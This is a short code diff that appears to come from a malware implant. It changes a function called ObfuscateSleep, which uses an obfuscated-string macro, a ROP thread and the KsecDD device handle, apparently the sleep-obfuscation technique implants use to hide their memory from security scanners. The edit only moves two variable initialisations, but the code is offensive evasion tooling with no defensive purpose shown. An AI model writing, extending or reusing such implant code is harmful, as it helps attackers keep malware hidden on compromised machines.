@@ -37,7 +37,8 @@ BOOL AddValidCallTarget(void* pointer) {
 BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     HEXANE
 
-    PWCHAR              ksecdd_name     = { };
+    BOOL                success         = TRUE;
+    LPWSTR              ksecdd_name     = OBFW(L"\\Device\\KsecDD");
     CLIENT_ID           src_cid         = { };
     UNICODE_STRING      src_uni         = { };
     IO_STATUS_BLOCK     ksecdd_iostat   = { };
@@ -54,7 +55,6 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     ULONG       ContextResPrt = 0;
     ULONG       success_count = 0;
 
-    BOOL        success     = TRUE;
     HANDLE      rop_thread  = { };
     HANDLE      src_thread  = { };
     HANDLE      sync_event  = { };
@@ -93,7 +93,6 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     src_object.Length = sizeof( src_object );
     sec_object.Length = sizeof( sec_object );
 
-    ksecdd_name = OBFW(L"\\Device\\KsecDD");
 
     Ctx->nt.RtlInitUnicodeString( &src_uni, ksecdd_name );
     InitializeObjectAttributes( &sec_object, &src_uni, 0, nullptr, nullptr );
